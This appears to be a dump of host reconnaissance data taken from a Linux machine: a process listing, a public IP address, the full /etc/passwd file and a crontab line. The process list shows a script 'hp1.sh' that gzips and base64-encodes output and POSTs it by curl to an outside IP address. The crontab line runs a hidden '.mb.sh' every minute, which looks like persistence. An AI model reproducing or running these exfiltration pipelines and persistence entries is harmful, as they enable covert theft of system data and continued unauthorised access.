+derek    2932979  0.0  0.0   3580  1376 tty1     S    22:48   0:00 bwrap --unshare-all --die-with-parent --chdir / --ro-bind /usr /usr --dev /dev --ro-bind-try /etc/ld.so.cache /etc/ld.so.cache --ro-bind-try /nix/store /nix/store --tmpfs /tmp-home --tmpfs /tmp-run --clearenv --setenv HOME /tmp-home --setenv XDG_RUNTIME_DIR /tmp-run --setenv XDG_RUNTIME_DIR /run/user/1000 --symlink /usr/lib32 /lib32 --symlink /usr/libx32 /libx32 --symlink /usr/lib64 /lib64 --symlink /usr/lib /lib --seccomp 30 /usr/libexec/glycin-loaders/2+/glycin-image-rs --dbus-fd 29
+derek    2932980  0.0  0.0 212728  6588 tty1     Sl   22:48   0:00 /usr/libexec/glycin-loaders/2+/glycin-image-rs --dbus-fd 29
+derek    2932988  0.0  0.0   3584  2020 tty1     S    22:48   0:00 bwrap --unshare-all --die-with-parent --chdir / --ro-bind /usr /usr --dev /dev --ro-bind-try /etc/ld.so.cache /etc/ld.so.cache --ro-bind-try /nix/store /nix/store --tmpfs /tmp-home --tmpfs /tmp-run --clearenv --setenv HOME /tmp-home --setenv XDG_RUNTIME_DIR /tmp-run --setenv XDG_RUNTIME_DIR /run/user/1000 --symlink /usr/lib32 /lib32 --symlink /usr/libx32 /libx32 --symlink /usr/lib64 /lib64 --symlink /usr/lib /lib --ro-bind-try /etc/fonts/conf.d /etc/fonts/conf.d --ro-bind-try /etc/fonts/fonts.conf /etc/fonts/fonts.conf --ro-bind-try /home/derek/.cache/fontconfig /home/derek/.cache/fontconfig --ro-bind-try /var/cache/fontconfig /var/cache/fontconfig --bind-try /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --setenv XDG_CACHE_HOME /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --seccomp 25 /usr/libexec/glycin-loaders/2+/glycin-svg --dbus-fd 24
+derek    2932989  0.0  0.0   3584  1364 tty1     S    22:48   0:00 bwrap --unshare-all --die-with-parent --chdir / --ro-bind /usr /usr --dev /dev --ro-bind-try /etc/ld.so.cache /etc/ld.so.cache --ro-bind-try /nix/store /nix/store --tmpfs /tmp-home --tmpfs /tmp-run --clearenv --setenv HOME /tmp-home --setenv XDG_RUNTIME_DIR /tmp-run --setenv XDG_RUNTIME_DIR /run/user/1000 --symlink /usr/lib32 /lib32 --symlink /usr/libx32 /libx32 --symlink /usr/lib64 /lib64 --symlink /usr/lib /lib --ro-bind-try /etc/fonts/conf.d /etc/fonts/conf.d --ro-bind-try /etc/fonts/fonts.conf /etc/fonts/fonts.conf --ro-bind-try /home/derek/.cache/fontconfig /home/derek/.cache/fontconfig --ro-bind-try /var/cache/fontconfig /var/cache/fontconfig --bind-try /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --setenv XDG_CACHE_HOME /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --seccomp 25 /usr/libexec/glycin-loaders/2+/glycin-svg --dbus-fd 24
+derek    2932990  0.0  0.0 306336 16784 tty1     Sl   22:48   0:00 /usr/libexec/glycin-loaders/2+/glycin-svg --dbus-fd 24
+derek    2933305  0.0  0.0 309032  6800 ?        Ssl  22:48   0:00 /usr/lib/x86_64-linux-gnu/xfce4/xfconf/xfconfd
+root     2933358  0.0  0.0  20484  7976 pts/10   S+   22:48   0:00 sudo wireshark
+root     2933378  0.0  0.0  20616  2592 pts/11   Ss   22:48   0:00 sudo wireshark
+root     2933379  8.5  0.8 2493936 266476 pts/11 Sl+  22:48   0:00 wireshark
+root     2933392  0.0  0.0   6788  2492 pts/11   S+   22:48   0:00 dbus-launch --autolaunch d349b4282c5f4bed85aa5274fef5b24d --binary-syntax --close-stderr
+root     2933393  0.0  0.0   8648  2976 ?        Ss   22:48   0:00 /usr/bin/dbus-daemon --syslog-only --fork --print-pid 5 --print-address 7 --session
+root     2933395  0.2  0.0 482124 18620 ?        Sl   22:48   0:00 /usr/libexec/xdg-desktop-portal
+root     2933402  0.0  0.0 309008  6792 ?        Sl   22:48   0:00 /usr/libexec/xdg-permission-store
+root     2933408  0.0  0.0 539052  7292 ?        Sl   22:48   0:00 /usr/libexec/xdg-document-portal
+root     2933414  0.0  0.0   2596  1592 ?        Ss   22:48   0:00 fusermount3 --auto-unmount -- /root/.cache/doc
+root     2933418  0.2  0.0 484216 20824 ?        Sl   22:48   0:00 /usr/libexec/xdg-desktop-portal-gtk
+root     2933433  0.0  0.0 314408  8576 ?        Sl   22:48   0:00 /usr/libexec/gvfsd
+root     2933439  0.0  0.0 326144  8056 ?        Sl   22:48   0:00 /usr/libexec/gvfsd-fuse /root/.gvfs -f
+root     2933449  0.0  0.0 183616 10200 ?        Sl   22:48   0:00 /usr/bin/gnome-keyring-daemon --start --foreground --components=secrets
+derek    2933463  0.0  0.0   3584  2220 tty1     S    22:48   0:00 bwrap --unshare-all --die-with-parent --chdir / --ro-bind /usr /usr --dev /dev --ro-bind-try /etc/ld.so.cache /etc/ld.so.cache --ro-bind-try /nix/store /nix/store --tmpfs /tmp-home --tmpfs /tmp-run --clearenv --setenv HOME /tmp-home --setenv XDG_RUNTIME_DIR /tmp-run --setenv XDG_RUNTIME_DIR /run/user/1000 --symlink /usr/lib32 /lib32 --symlink /usr/libx32 /libx32 --symlink /usr/lib64 /lib64 --symlink /usr/lib /lib --ro-bind-try /etc/fonts/conf.d /etc/fonts/conf.d --ro-bind-try /etc/fonts/fonts.conf /etc/fonts/fonts.conf --ro-bind-try /home/derek/.cache/fontconfig /home/derek/.cache/fontconfig --ro-bind-try /var/cache/fontconfig /var/cache/fontconfig --bind-try /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --setenv XDG_CACHE_HOME /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --seccomp 32 /usr/libexec/glycin-loaders/2+/glycin-svg --dbus-fd 31
+derek    2933464  0.0  0.0   3584  1348 tty1     S    22:48   0:00 bwrap --unshare-all --die-with-parent --chdir / --ro-bind /usr /usr --dev /dev --ro-bind-try /etc/ld.so.cache /etc/ld.so.cache --ro-bind-try /nix/store /nix/store --tmpfs /tmp-home --tmpfs /tmp-run --clearenv --setenv HOME /tmp-home --setenv XDG_RUNTIME_DIR /tmp-run --setenv XDG_RUNTIME_DIR /run/user/1000 --symlink /usr/lib32 /lib32 --symlink /usr/libx32 /libx32 --symlink /usr/lib64 /lib64 --symlink /usr/lib /lib --ro-bind-try /etc/fonts/conf.d /etc/fonts/conf.d --ro-bind-try /etc/fonts/fonts.conf /etc/fonts/fonts.conf --ro-bind-try /home/derek/.cache/fontconfig /home/derek/.cache/fontconfig --ro-bind-try /var/cache/fontconfig /var/cache/fontconfig --bind-try /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --setenv XDG_CACHE_HOME /home/derek/.cache/glycin/usr/libexec/glycin-loaders/2+/glycin-svg --seccomp 32 /usr/libexec/glycin-loaders/2+/glycin-svg --dbus-fd 31
+derek    2933465  0.0  0.0 306336 16160 tty1     Sl   22:48   0:00 /usr/libexec/glycin-loaders/2+/glycin-svg --dbus-fd 31
+root     2933650  0.0  0.0      0     0 ?        I    22:48   0:00 [kworker/u65:0-flush-259:0]
+root     2933660  0.0  0.0      0     0 ?        I    22:48   0:00 [kworker/u65:4-writeback]
+root     2933698  0.0  0.0  12356  7280 pts/11   S+   22:48   0:00 /usr/bin/dumpcap --log-level MESSAGE --application-flavor wireshark -F pcapng -i wlan0 -y EN10MB -Z 33
+derek    2933708 52.6  0.2 2441660 83144 tty1    Sl   22:48   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {e82d5eab-e1d8-4db1-9913-b5c977f9ebac} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 319 tab
+derek    2933731  0.0  0.0   7192  3724 pts/8    S+   22:48   0:00 /bin/bash ./hp1.sh
+derek    2933732  0.0  0.0   7192  1660 pts/8    S+   22:48   0:00 /bin/bash ./hp1.sh
+derek    2933734  0.0  0.0   7192  1940 pts/8    S+   22:48   0:00 /bin/bash ./hp1.sh
+derek    2933735  0.0  0.0   5600  2132 pts/8    S+   22:48   0:00 base64 -w0
+derek    2933737  0.0  0.0   5892  2192 pts/8    S+   22:48   0:00 xargs -I{} curl -sf -X POST http://131.123.43.239/up -H X-Name: fxr2 --data-binary {}
+derek    2933738  0.0  0.0   7192  2292 pts/8    S+   22:48   0:00 /bin/bash ./hp1.sh
+derek    2933739  0.0  0.0   3312  1692 pts/8    S+   22:48   0:00 gzip -c
+derek    2933740  0.0  0.0   5600  2148 pts/8    S+   22:48   0:00 base64 -w0
+derek    2933742  0.0  0.0   7192  1960 pts/8    S+   22:48   0:00 /bin/bash ./hp1.sh
+derek    2933743  0.0  0.0  21464 10676 pts/8    S+   22:48   0:00 curl -sk -m 60 -X POST --data-binary @- http://131.123.43.239/up -H X-Name: hp1_out
+derek    2933753  100  0.0   8228  3784 pts/8    R+   22:48   0:00 ss -tlnp
+derek    2933754  100  0.0  10160  5088 pts/8    R+   22:48   0:00 ps -axuwwww
+67.80.251.219
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:997:997:systemd Network Management:/:/usr/sbin/nologin
+_dhcpcd:x:995:995:DHCP Client Daemon:/var/lib/dhcpcd:/sbin/nologin
+* * * * * bash /opt/zimbra/log/.mb.sh >/dev/null 2>&1
